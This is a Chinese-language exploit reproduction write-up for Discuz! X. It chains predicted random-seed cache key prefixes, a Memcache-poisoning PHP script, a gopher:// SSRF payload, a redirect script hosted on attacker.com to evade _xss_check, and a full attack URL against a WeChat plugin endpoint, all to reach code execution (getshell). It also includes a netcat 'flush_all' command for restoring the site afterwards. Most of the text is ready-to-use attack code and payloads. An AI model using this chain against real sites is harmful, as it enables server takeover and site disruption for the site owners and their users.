Discuz! X authkey+Memcache+ssrf getshell
========================================

一、漏洞简介
------------

需要得到authkey

二、漏洞影响
------------

三、复现过程
------------

Dz 整合 Memcache
配置成功后，默认情况下网站首页右下角会出现`MemCache On`的标志：

![](./.resource/Discuz!Xauthkey+Memcache+ssrfgetshell/media/rId24.jpg)

Dz 在安装的时候，对于缓存中的键名加了随机字符串作为前缀。所以如果 SSRF
要攻击 Memcache ，第一个问题是，如何找到正确的键名？

`install/index.php` 345-357行：

            $uid = DZUCFULL ? 1 : $adminuser['uid'];
            $authkey = md5($_SERVER['SERVER_ADDR'].$_SERVER['HTTP_USER_AGENT'].$dbhost.$dbuser.$dbpw.$dbname.$username.$password.$pconnect.substr($timestamp, 0, 8)).random(18);
            $_config['db'][1]['dbhost'] = $dbhost;
            $_config['db'][1]['dbname'] = $dbname;
            $_config['db'][1]['dbpw'] = $dbpw;
            $_config['db'][1]['dbuser'] = $dbuser;
            $_config['db'][1]['tablepre'] = $tablepre;
            $_config['admincp']['founder'] = (string)$uid;
            $_config['security']['authkey'] = $authkey;
            $_config['cookie']['cookiepre'] = random(4).'_';
            $_config['memory']['prefix'] = random(6).'_';

            save_config_file(ROOT_PATH.CONFIG, $_config, $default_config);

这是 Dz 在安装的时候的一段代码，这段代码设置了 authkey、Cookie
前缀以及缓存键名前缀，其中用到了`random`函数生成随机字符串。所以跟进这个`random`：

    function random($length) {
        $hash = '';
        $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
        $max = strlen($chars) - 1;
        PHP_VERSION < '4.2.0' && mt_srand((double)microtime() * 1000000);
        for($i = 0; $i < $length; $i++) {
            $hash .= $chars[mt_rand(0, $max)];
        }
        return $hash;
    }

可以发现，如果 PHP 版本大于 4.2.0，那么 `mt_rand`
随机数的种子是不变的。也就是说，生成 authkey、Cookie
前缀以及缓存键名前缀时调用的 `mt_rand` 用的都是同一个种子，而 Cookie
前缀是已知的，通过观察 HTTP
请求就可以知道。因此，随机数播种的种子可以被缩到一个极小的范围内进行猜解。这里可以用
[php\_mt\_seed](https://link.zhihu.com/?target=http%3A//www.openwall.com/php_mt_seed/README)
进行种子爆破。

通过 `mt_rand` 种子的猜解，缓存键名前缀的可能性从 62\^6 缩小到不到 1000
个，这就完全属于可以爆破的范畴了。对猜解出来的所有可能的缓存键名前缀分别构造
SSRF 请求发送到服务器，最后即能更改某一键名对应的键值。

Memcache
缓存键名的问题解决了，接下来的问题是，缓存数据被加载到哪了？如何通过修改缓存数据来
getshell？

这一部分的思路就可以直接参照 chengable 写的那篇文章了，`output_replace`
函数细节有略微变化，但大体思路是一致的，所以我也不再赘述了。

最后准备用 gopher 协议构造 SSRF 的
payload。写这样一段代码（先假设缓存键名前缀是 `IwRW7l`）:

    <?php

    $_G['setting']['output']['preg']['search']['plugins'] = '/.*/';
    $_G['setting']['output']['preg']['replace']['plugins'] = 'phpinfo()';
    $_G['setting']['rewritestatus'] = 1;

    $memcache = new Memcache;
    $memcache->connect('localhost', 11211) or die ("Could not connect");
    $memcache->set('IwRW7l_setting', $_G['setting']);

运行这段 PHP 代码，同时抓包，然后将数据包改成 gopher 的形式，即：

    gopher://localhost:11211/_set%20IwRW7l_setting%201%200%20161%0d%0aa%3A2%3A%7Bs%3A6%3A%22output%22%3Ba%3A1%3A%7Bs%3A4%3A%22preg%22%3Ba%3A2%3A%7Bs%3A6%3A%22search%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A4%3A%22%2F.*%2F%22%3B%7Ds%3A7%3A%22replace%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A9%3A%22phpinfo()%22%3B%7D%7D%7Ds%3A13%3A%22rewritestatus%22%3Bi%3A1%3B%7D

但是直接用它去 SSRF
是不可以的，会被`_xss_check`检测到特殊字符而被拒绝请求：

image

所以利用这里请求跟随跳转的特点，在自己的远程服务器上放类似于这样的一个脚本：

    <?php

    $url = base64_decode($_REQUEST['url']);
    header( "Location: " . $url );

这样就可以将 SSRF URL 进行 base64 编码从而规避`_xss_check`的检测。

    http://target/plugin.php?id=wechat:wechat&ac=wxregister&username=vov&avatar=http%3A%2F%2Fattacker.com%2F302.php%3Furl%3DZ29waGVyOi8vbG9jYWxob3N0OjExMjExL19zZXQlMjBJd1JXN2xfc2V0dGluZyUyMDElMjAwJTIwMTYxJTBkJTBhYSUzQTIlM0ElN0JzJTNBNiUzQSUyMm91dHB1dCUyMiUzQmElM0ExJTNBJTdCcyUzQTQlM0ElMjJwcmVnJTIyJTNCYSUzQTIlM0ElN0JzJTNBNiUzQSUyMnNlYXJjaCUyMiUzQmElM0ExJTNBJTdCcyUzQTclM0ElMjJwbHVnaW5zJTIyJTNCcyUzQTQlM0ElMjIlMkYuKiUyRiUyMiUzQiU3RHMlM0E3JTNBJTIycmVwbGFjZSUyMiUzQmElM0ExJTNBJTdCcyUzQTclM0ElMjJwbHVnaW5zJTIyJTNCcyUzQTklM0ElMjJwaHBpbmZvKCklMjIlM0IlN0QlN0QlN0RzJTNBMTMlM0ElMjJyZXdyaXRlc3RhdHVzJTIyJTNCaSUzQTElM0IlN0Q%253D&wxopenid=xxxyyy

再访问`/forum.php?mod=ajax&action=getthreadtypes&inajax=yes`，即可看到`phpinfo()`代码已被执行：

![](./.resource/Discuz!Xauthkey+Memcache+ssrfgetshell/media/rId26.png)

由于缓存被暴力篡改，会导致网站无法正常运行。恢复正常办法是刷新缓存。用上面的思路直接一次
getshell 后执行以下命令，网站就可以恢复正常：

    echo -e 'flush_all' | nc localhost 11211

参考链接
--------

> https://zhuanlan.zhihu.com/p/51907363
